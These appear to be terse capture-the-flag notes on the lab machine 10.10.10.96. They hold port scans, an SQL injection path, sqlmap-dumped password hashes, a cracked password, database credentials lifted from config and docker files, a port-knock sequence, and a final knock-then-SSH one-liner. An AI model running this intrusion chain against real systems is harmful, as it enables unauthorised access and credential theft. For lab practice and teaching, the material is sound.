IP = 10.10.10.96

Nmap (nmap -p- -vvv -Pn 10.10.10.96)
```bash
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack
8080/tcp open  http-proxy syn-ack
```

Nmap2 (nmap -sC -sV 10.10.10.96 )
```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: OZ webapi
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
```

(PORT 8080) interesting http response headers
```
Server: Werkzeug/0.14.1 Python/2.7.14
```

(PORT 80) SQL INJECTION
```
http://10.10.10.96/users/<SQL INJECT>
```

sqlmap output
```
$pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | dorthi      |
| 2  | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | tin.man     |
| 3  | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | wizard.oz   |
| 4  | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | coward.lyon |
| 5  | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | toto        |
| 6  | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | admin
```

creds
```
wizardofoz22
```

host 10.100.10.4 sql
```
MySQL 5.5.59-MariaDB-1~wheezy
Version: 5.5.59-MariaDB-1~wheezy
```

from /app/ticketer/database.py
```
mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb
```

from /containers/database/
```bash
docker run -d -v /connect/mysql:/var/lib/mysql --name ozdb \
--net prodnet --ip 10.100.10.4 \
-e MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss \
-e MYSQL_USER=dorthi \
-e MYSQL_PASSWORD=N0Pl4c3L1keH0me \
-e MYSQL_DATABASE=ozdb \
-v /connect/sshkeys:/home/dorthi/.ssh/:ro \
-v /dev/null:/root/.bash_history:ro \
-v /dev/null:/root/.ash_history:ro \
-v /dev/null:/root/.sh_history:ro \
--restart=always \
mariadb:5.5
```

knockd.conf
```
[options]
        logfile = /var/log/knockd.log

[opencloseSSH]

        sequence        = 40809:udp,50212:udp,46969:udp
        seq_timeout     = 15
        start_command   = ufw allow from %IP% to any port 22
        cmd_timeout     = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags        = syn

```

knock -u 10.10.10.96 40809 50212 46969 && nmap -p 22 -Pn -T4 10.10.10.96 && ssh -i id_rsa dorthi@10.10.10.96
N0Pl4c3L1keH0me